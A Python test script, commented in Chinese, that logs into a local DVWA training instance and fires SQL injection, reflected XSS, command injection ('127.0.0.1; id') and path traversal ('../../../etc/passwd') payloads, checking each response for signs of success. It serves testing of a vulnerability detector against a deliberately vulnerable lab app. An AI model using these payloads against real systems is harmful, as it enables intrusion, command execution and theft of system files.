"""手动测试 SQLi 检测逻辑"""
import asyncio
import sys
import re
sys.stdout.reconfigure(encoding='utf-8')

import httpx

DVWA = "http://192.168.18.131/dvwa"

async def main():
    print("=" * 60)
    print("手动 SQLi 测试")
    print("=" * 60)
    
    async with httpx.AsyncClient(timeout=10, follow_redirects=True, verify=False) as c:
        # 登录
        await c.get(f"{DVWA}/login.php")
        await c.post(f"{DVWA}/login.php", data={"username": "admin", "password": "password", "Login": "Login"})
        
        # 设置 security=low
        r = await c.get(f"{DVWA}/security.php")
        m = re.search(r"user_token'\s*value\s*=\s*'([^']+)'", r.text)
        token = m.group(1) if m else ""
        await c.post(f"{DVWA}/security.php", data={"security": "low", "seclev_submit": "Submit", "user_token": token})
        print("[OK] DVWA ready")
        
        # 测试 Error-based
        print("\n[*] 测试 Error-based SQLi...")
        
        payloads = [
            "1'",
            "1\"",
            "1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            "1 UNION SELECT 1,2,3--",
        ]
        
        for payload in payloads:
            r = await c.get(f"{DVWA}/vulnerabilities/sqli/", params={"id": payload, "Submit": "Submit"})
            
            # 检查错误
            errors = ["syntax", "mysql", "error", "warning", "XPATH", "UPDATEXML", "EXTRACTVALUE"]
            found = [e for e in errors if e.lower() in r.text.lower()]
            
            if found:
                print(f"  [!] Payload: {payload[:40]}")
                print(f"      错误: {found}")
                # 打印片段
                idx = r.text.lower().find(found[0].lower())
                if idx >= 0:
                    snippet = r.text[max(0, idx-50):idx+100]
                    print(f"      片段: {snippet[:100]}")
        
        # 测试 XSS
        print("\n[*] 测试 XSS...")
        
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
        ]
        
        for payload in xss_payloads:
            r = await c.get(f"{DVWA}/vulnerabilities/xss_r/", params={"name": payload})
            
            if payload in r.text:
                print(f"  [!] Payload 反射成功: {payload[:40]}")
        
        # 测试 CMDi
        print("\n[*] 测试 CMDi...")
        
        cmdi_payloads = [
            "127.0.0.1; id",
            "127.0.0.1 | id",
            "127.0.0.1 && id",
        ]
        
        for payload in cmdi_payloads:
            r = await c.get(f"{DVWA}/vulnerabilities/exec/", params={"ip": payload, "Submit": "Submit"})
            
            if "uid=" in r.text or "root" in r.text:
                print(f"  [!] 命令执行成功: {payload}")
                # 打印片段
                if "uid=" in r.text:
                    idx = r.text.find("uid=")
                    print(f"      输出: {r.text[idx:idx+100]}")
        
        # 测试 LFI
        print("\n[*] 测试 LFI...")
        
        lfi_payloads = [
            "../../../etc/passwd",
            "/etc/passwd",
            "....//....//....//etc/passwd",
        ]
        
        for payload in lfi_payloads:
            r = await c.get(f"{DVWA}/vulnerabilities/fi/", params={"page": payload})
            
            if "root:" in r.text:
                print(f"  [!] 文件读取成功: {payload}")
                lines = r.text.split("\n")[:3]
                print(f"      内容: {lines}")
        
        print("\n" + "=" * 60)
        print("测试完成")
        print("=" * 60)

asyncio.run(main())
